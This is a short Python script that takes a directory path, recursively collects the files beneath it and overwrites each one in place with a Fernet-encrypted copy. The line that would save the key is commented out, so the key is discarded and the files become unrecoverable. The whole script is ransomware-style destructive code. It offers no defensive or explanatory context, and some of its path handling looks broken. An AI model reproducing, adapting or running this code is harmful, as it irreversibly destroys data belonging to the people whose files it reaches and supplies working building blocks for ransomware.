import os
import glob
from cryptography.fernet import Fernet
import sys

all_dir = []
all_s_dir = []
all_s_file = []
allsd = {}
t_dir = input()


all_s_dirs = []
target_files = []

key = Fernet.generate_key()
  
# string the key in a file
#with open('filekey.key', 'wb') as filekey:
   #filekey.write(key)

def listdirs(rootdir):
    for it in os.scandir(rootdir):
        if it.is_dir():
            listdirs(it)
            all_dir.append(it.path)


def listdirs(t_dir):
    for it in os.scandir(t_dir):
        if it.is_dir():
            listdirs(it)
            all_s_dir.append(it.path)
 
for it in os.scandir(t_dir):
    if it.is_file():
        all_s_file.append(it.path)

listdirs(t_dir)

for i in all_s_dir:
    all_s_dirs.append(i.split('sync')[-1])
all_s_dirs.append(t_dir.split('sync')[-1])

for i in all_s_dirs:
    allsd[i]=glob.glob(f"{i}/*.*")
allsd = list(allsd.values())
for i in allsd:
    for j in i:
        target_files.append(j)

all_dir = 0
all_s_dir = 0
all_s_file = 0
allsd = 0
all_s_dirs = 0


def enc_file(tfile,ekey):
    # opening the key
    key = ekey
    
    # using the generated key
    fernet = Fernet(key)
    
    # opening the original file to encrypt
    with open(tfile, 'rb') as file:
        original = file.read()

    # encrypting the file
    encrypted = fernet.encrypt(original)
    
    # opening the file in write mode and 
    # writing the encrypted data
    with open(tfile, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

for i in target_files:
    enc_file(i,key)
